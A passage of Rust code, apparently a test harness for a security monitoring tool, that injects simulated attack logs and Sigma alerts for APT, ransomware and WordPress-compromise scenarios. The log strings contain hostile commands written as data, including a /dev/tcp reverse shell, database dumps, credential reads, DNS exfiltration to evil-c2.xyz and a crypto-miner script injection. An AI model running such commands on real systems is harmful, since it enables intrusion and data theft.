        "message": format!("Accepted password for postgres from {} port 50123 ssh2", app_server),
        "ident": "sshd", "pid": 6001, "facility": "auth", "severity": "info",
        "source_ip": app_server, "username": "postgres",
        "timestamp": phase6_start.to_rfc3339(),
    }), &phase6_start).await;
    result.logs_injected += 1;

    // DB dump
    for (i, cmd) in [
        "pg_dumpall -U postgres > /tmp/.dump.sql",
        "tar czf /tmp/.dump.tar.gz /tmp/.dump.sql",
        "split -b 1M /tmp/.dump.tar.gz /tmp/.chunk_",
    ]
    .iter()
    .enumerate()
    {
        let ts = phase6_start + chrono::Duration::seconds(10 + i as i64 * 8);
        inject_log(
            store,
            "syslog.udp.audit",
            db_server,
            &json!({
                "message": format!("EXECVE pid=6100 uid=0 comm=\"bash\" cmdline=\"{}\"", cmd),
                "ident": "auditd", "facility": "auth", "severity": "warning",
                "username": "postgres",
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "db-exfil-001",
        "critical",
        &format!(
            "Exfiltration base de données : pg_dumpall sur {} depuis {}",
            db_server, app_server
        ),
        db_server,
        Some(app_server),
        Some("postgres"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 7: Pivot vers file_server + AD (3ème attaquant) ──
    let phase7_start = now - chrono::Duration::minutes(7);
    inject_log(store, "syslog.udp.auth", file_server, &json!({
        "message": format!("SMB connection from {} user=CORP\\admin$ share=C$ status=SUCCESS", attackers[2]),
        "ident": "smbd", "facility": "daemon", "severity": "warning",
        "source_ip": attackers[2], "username": "CORP\\admin$",
        "timestamp": phase7_start.to_rfc3339(),
    }), &phase7_start).await;
    result.logs_injected += 1;

    inject_log(store, "syslog.udp.auth", dc_server, &json!({
        "message": format!("Kerberos TGT request from {} for CORP\\Administrator — GOLDEN TICKET SUSPECTED (rc4-hmac)", attackers[2]),
        "ident": "krb5kdc", "facility": "auth", "severity": "crit",
        "source_ip": attackers[2], "username": "CORP\\Administrator",
        "timestamp": (phase7_start + chrono::Duration::seconds(15)).to_rfc3339(),
    }), &(phase7_start + chrono::Duration::seconds(15))).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "golden-ticket-001",
        "critical",
        &format!(
            "Golden Ticket suspecté : {} → {} (CORP\\Administrator)",
            attackers[2], dc_server
        ),
        dc_server,
        Some(attackers[2]),
        Some("CORP\\Administrator"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 8: DNS exfiltration ──
    let phase8_start = now - chrono::Duration::minutes(3);
    for i in 0..20 {
        let ts = phase8_start + chrono::Duration::seconds(i * 3);
        let chunk = format!("{:08x}", i);
        inject_log(
            store,
            "syslog.udp.dns",
            db_server,
            &json!({
                "message": format!("query: {}.data.evil-c2.xyz IN TXT +", chunk),
                "ident": "named", "facility": "daemon", "severity": "info",
                "source_ip": db_server,
                "dns_query": format!("{}.data.evil-c2.xyz", chunk),
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "dns-exfil-001",
        "critical",
        &format!(
            "DNS exfiltration détectée : {} → *.data.evil-c2.xyz (20 requêtes TXT en 60s)",
            db_server
        ),
        db_server,
        None,
        None,
    )
    .await;
    result.alerts_created += 1;

    result.message = format!(
        "APT multi-cibles : {} logs injectés, {} alertes Sigma. 3 attaquants → 5 serveurs. Phases: recon → Log4Shell → creds → pivot SSH → xz backdoor → DB dump → Golden Ticket → DNS exfil.",
        result.logs_injected, result.alerts_created
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Propagation ransomware réseau
// ═══════════════════════════════════════════════════════════

async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let now = chrono::Utc::now();
    let attacker = "194.26.192.77";
    let patient_zero = "192.168.1.50";
    let victims = [
        "192.168.1.51",
        "192.168.1.52",
        "192.168.1.53",
        "192.168.1.54",
    ];

    // ── Phase 1: Initial compromise via phishing + macro ──
    let ts = now - chrono::Duration::minutes(20);
    inject_log(store, "syslog.udp.httpd", patient_zero, &json!({
        "message": format!("{} - user1 [{}] \"GET /invoice_2024.xlsm HTTP/1.1\" 200 45678", attacker, ts.format("%d/%b/%Y:%H:%M:%S")),
        "ident": "squid", "facility": "daemon", "severity": "info",
        "source_ip": patient_zero, "url": "http://malware-host.xyz/invoice_2024.xlsm",
        "timestamp": ts.to_rfc3339(),
    }), &ts).await;
    result.logs_injected += 1;

    let ts = now - chrono::Duration::minutes(19);
    inject_log(store, "syslog.udp.audit", patient_zero, &json!({
        "message": "EXECVE pid=8001 uid=1000 comm=\"powershell.exe\" cmdline=\"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\"",
        "ident": "auditd", "facility": "auth", "severity": "crit",
        "username": "user1",
        "timestamp": ts.to_rfc3339(),
    }), &ts).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "macro-exec-001",
        "high",
        &format!(
            "Macro Office malveillante exécutée sur {} (user: user1) — PowerShell encodé",
            patient_zero
        ),
        patient_zero,
        None,
        Some("user1"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 2: C2 beacon ──
    let phase2_start = now - chrono::Duration::minutes(18);
    for i in 0..10 {
        let ts = phase2_start + chrono::Duration::seconds(i * 30);
        inject_log(
            store,
            "syslog.udp.dns",
            patient_zero,
            &json!({
                "message": format!("query: beacon-{:04x}.c2-ransomware.xyz IN A +", i),
                "ident": "named", "facility": "daemon", "severity": "info",
                "source_ip": patient_zero,
                "dns_query": format!("beacon-{:04x}.c2-ransomware.xyz", i),
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "c2-beacon-001",
        "critical",
        &format!(
            "C2 beacon détecté : {} → *.c2-ransomware.xyz (10 requêtes périodiques 30s)",
            patient_zero
        ),
        patient_zero,
        None,
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 3: SMB lateral spread (EternalBlue pattern) ──
    let phase3_start = now - chrono::Duration::minutes(12);
    for (i, victim) in victims.iter().enumerate() {
        let ts = phase3_start + chrono::Duration::seconds(i as i64 * 15);
        inject_log(store, "syslog.udp.auth", victim, &json!({
            "message": format!("SMB: {} connected to \\\\{}\\ADMIN$ using NTLM — suspicious PsExec pattern", patient_zero, victim),
            "ident": "smbd", "facility": "daemon", "severity": "crit",
            "source_ip": patient_zero, "username": "SYSTEM",
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;

        // Service installation (ransomware binary)
        let ts2 = ts + chrono::Duration::seconds(5);
        inject_log(store, "syslog.udp.audit", victim, &json!({
            "message": format!("Service installed: name=MsUpdate path=C:\\Windows\\Temp\\svc.exe start=auto (PID {})", 9000 + i),
            "ident": "eventlog", "facility": "daemon", "severity": "crit",
            "username": "SYSTEM",
            "timestamp": ts2.to_rfc3339(),
        }), &ts2).await;
        result.logs_injected += 1;

        inject_sigma_alert(
            store,
            &format!("ransomware-spread-{}", i),
            "critical",
            &format!(
                "Propagation ransomware via SMB : {} → {} (PsExec + service install)",
                patient_zero, victim
            ),
            victim,
            Some(patient_zero),
            Some("SYSTEM"),
        )
        .await;
        result.alerts_created += 1;
    }

    // ── Phase 4: File encryption on all victims ──
    let phase4_start = now - chrono::Duration::minutes(5);
    for (i, victim) in victims.iter().enumerate() {
        let ts = phase4_start + chrono::Duration::seconds(i as i64 * 10);
        inject_log(store, "syslog.udp.audit", victim, &json!({
            "message": format!("File system activity: 1247 files renamed to *.locked in /srv/data/ — ransomware encryption in progress"),
            "ident": "auditd", "facility": "kern", "severity": "emerg",
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "ransomware-encrypt-001",
        "critical",
        &format!(
            "Chiffrement ransomware en cours sur {} serveurs — {} fichiers .locked",
            victims.len(),
            victims.len() * 1247
        ),
        patient_zero,
        None,
        None,
    )
    .await;
    result.alerts_created += 1;

    // Ransom note
    inject_log(store, "syslog.udp.audit", patient_zero, &json!({
        "message": "File created: C:\\README_RESTORE_FILES.txt — 'Your files have been encrypted. Send 5 BTC to bc1q...'",
        "ident": "auditd", "facility": "kern", "severity": "emerg",
        "timestamp": now.to_rfc3339(),
    }), &now).await;
    result.logs_injected += 1;

    result.message = format!(
        "Ransomware spread : {} logs, {} alertes. Chaîne: phishing → macro → C2 beacon → SMB lateral (4 victimes) → chiffrement {} fichiers.",
        result.logs_injected,
        result.alerts_created,
        victims.len() * 1247
    );
}

// ═══════════════════════════════════════════════════════════
// SCENARIO: Compromission WordPress
// ═══════════════════════════════════════════════════════════

async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
    let now = chrono::Utc::now();
    let attacker = "45.155.205.233";
    let web_server = "192.168.1.80";

    // ── Phase 1: Plugin enumeration ──
    let phase1_start = now - chrono::Duration::minutes(15);
    let plugins = [
        "contact-form-7",
        "elementor",
        "woocommerce",
        "wp-file-manager",
        "revslider",
        "yoast-seo",
        "wordfence",
        "all-in-one-wp-migration",
        "updraftplus",
        "acf-pro",
    ];
    for (i, plugin) in plugins.iter().enumerate() {
        let ts = phase1_start + chrono::Duration::seconds(i as i64);
        inject_log(store, "syslog.udp.httpd", web_server, &json!({
            "message": format!("{} - - [{}] \"GET /wp-content/plugins/{}/readme.txt HTTP/1.1\" {} 0",
                attacker, ts.format("%d/%b/%Y:%H:%M:%S"), plugin, if i % 3 == 0 { 200 } else { 404 }),
            "ident": "apache2", "facility": "daemon", "severity": "info",
            "source_ip": attacker, "http_method": "GET",
            "url": format!("/wp-content/plugins/{}/readme.txt", plugin),
            "timestamp": ts.to_rfc3339(),
        }), &ts).await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "wpscan-enum-001",
        "medium",
        &format!(
            "WPScan plugin enumeration détecté : {} → {} (10 plugins testés en 10s)",
            attacker, web_server
        ),
        web_server,
        Some(attacker),
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 2: Exploit WP File Manager (CVE-2020-25213) ──
    let phase2_start = now - chrono::Duration::minutes(12);
    inject_log(store, "syslog.udp.httpd", web_server, &json!({
        "message": format!("{} - - [{}] \"POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1\" 200 89",
            attacker, phase2_start.format("%d/%b/%Y:%H:%M:%S")),
        "ident": "apache2", "facility": "daemon", "severity": "warning",
        "source_ip": attacker, "http_method": "POST",
        "url": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "timestamp": phase2_start.to_rfc3339(),
    }), &phase2_start).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "cve-2020-25213",
        "critical",
        &format!(
            "CVE-2020-25213 (WP File Manager RCE) exploité : {} → {}",
            attacker, web_server
        ),
        web_server,
        Some(attacker),
        None,
    )
    .await;
    result.alerts_created += 1;

    // Webshell uploaded
    let ts = phase2_start + chrono::Duration::seconds(5);
    inject_log(store, "syslog.udp.httpd", web_server, &json!({
        "message": format!("{} - - [{}] \"POST /wp-content/uploads/2024/shell.php HTTP/1.1\" 200 4",
            attacker, ts.format("%d/%b/%Y:%H:%M:%S")),
        "ident": "apache2", "facility": "daemon", "severity": "crit",
        "source_ip": attacker, "http_method": "POST",
        "url": "/wp-content/uploads/2024/shell.php",
        "timestamp": ts.to_rfc3339(),
    }), &ts).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "webshell-001",
        "critical",
        "Webshell détecté : /wp-content/uploads/2024/shell.php",
        web_server,
        Some(attacker),
        None,
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 3: Reverse shell via webshell ──
    let phase3_start = now - chrono::Duration::minutes(10);
    inject_log(store, "syslog.udp.audit", web_server, &json!({
        "message": format!("EXECVE pid=15001 uid=33 comm=\"sh\" cmdline=\"sh -c 'bash -i >& /dev/tcp/{}/4444 0>&1'\"", attacker),
        "ident": "auditd", "facility": "auth", "severity": "crit",
        "username": "www-data",
        "timestamp": phase3_start.to_rfc3339(),
    }), &phase3_start).await;
    result.logs_injected += 1;

    // ── Phase 4: DB credential theft + data exfil ──
    let phase4_start = now - chrono::Duration::minutes(8);
    for (i, cmd) in [
        "cat /var/www/html/wp-config.php",
        "mysql -u wp_user -p'wp_pass123' wordpress -e 'SELECT user_login,user_pass FROM wp_users'",
        "mysql -u wp_user -p'wp_pass123' wordpress -e 'SELECT * FROM wp_wc_orders LIMIT 1000'",
    ]
    .iter()
    .enumerate()
    {
        let ts = phase4_start + chrono::Duration::seconds(i as i64 * 10);
        inject_log(
            store,
            "syslog.udp.audit",
            web_server,
            &json!({
                "message": format!("EXECVE pid=15100 uid=33 comm=\"bash\" cmdline=\"{}\"", cmd),
                "ident": "auditd", "facility": "auth", "severity": "warning",
                "username": "www-data",
                "timestamp": ts.to_rfc3339(),
            }),
            &ts,
        )
        .await;
        result.logs_injected += 1;
    }

    inject_sigma_alert(
        store,
        "wp-db-theft-001",
        "critical",
        "Vol de données WordPress : wp-config.php lu + dump users + dump commandes WooCommerce",
        web_server,
        Some(attacker),
        Some("www-data"),
    )
    .await;
    result.alerts_created += 1;

    // ── Phase 5: Crypto-miner injection ──
    let phase5_start = now - chrono::Duration::minutes(3);
    inject_log(store, "syslog.udp.httpd", web_server, &json!({
        "message": format!("{} - - [{}] \"POST /wp-content/uploads/2024/shell.php HTTP/1.1\" 200 0 \"cmd=echo '<script src=https://coinhive.min.js></script>' >> /var/www/html/wp-includes/header.php\"",
            attacker, phase5_start.format("%d/%b/%Y:%H:%M:%S")),
        "ident": "apache2", "facility": "daemon", "severity": "crit",
        "source_ip": attacker,
        "timestamp": phase5_start.to_rfc3339(),
    }), &phase5_start).await;
    result.logs_injected += 1;

    inject_sigma_alert(
        store,
        "cryptominer-001",
        "high",
        "Injection crypto-miner dans header.php WordPress — tous les visiteurs minent",
        web_server,
        Some(attacker),
        None,
    )
    .await;
    result.alerts_created += 1;

    result.message = format!(
        "WordPress compromise : {} logs, {} alertes. Chaîne: WPScan enum → CVE-2020-25213 → webshell → reverse shell → DB dump → crypto-miner.",
        result.logs_injected, result.alerts_created
    );
}

// ═══════════════════════════════════════════════════════════
// HELPERS — Direct pipeline injection (real DB inserts)
// ═══════════════════════════════════════════════════════════

/// Inject a log record directly into the `logs` table (same as Fluent Bit).
async fn inject_log(
    store: &Arc<dyn Database>,
    tag: &str,
    hostname: &str,
    data: &serde_json::Value,
    time: &chrono::DateTime<chrono::Utc>,
) {
    use crate::db::threatclaw_store::ThreatClawStore;
    let time_str = time.to_rfc3339();
    match store.insert_log(tag, hostname, data, &time_str).await {
        Ok(id) => tracing::debug!("TEST: Injected log id={} tag={} host={}", id, tag, hostname),
        Err(e) => tracing::warn!("TEST: Failed to inject log: {e}"),
    }
}

/// Inject a Sigma alert directly into the `sigma_alerts` table.
async fn inject_sigma_alert(
    store: &Arc<dyn Database>,
    rule_id: &str,
    level: &str,
    title: &str,
    hostname: &str,
    source_ip: Option<&str>,
    username: Option<&str>,
) {
    use crate::db::threatclaw_store::ThreatClawStore;
    match store
        .insert_sigma_alert(rule_id, level, title, hostname, source_ip, username)
        .await
    {
        Ok(id) => tracing::debug!("TEST: Injected sigma alert id={} rule={}", id, rule_id),
        Err(e) => tracing::warn!("TEST: Failed to inject alert: {e}"),
    }
}

fn base64_fake(i: usize) -> String {
    let data = [
        "cm9vdDokNiQ",
        "YWRtaW46JDYk",
        "YmFja3VwOiQ2",
        "d3d3LWRhdGE6",
        "cG9zdGdyZXM6",
    ];
    data.get(i).unwrap_or(&"dGVzdA").to_string()
}
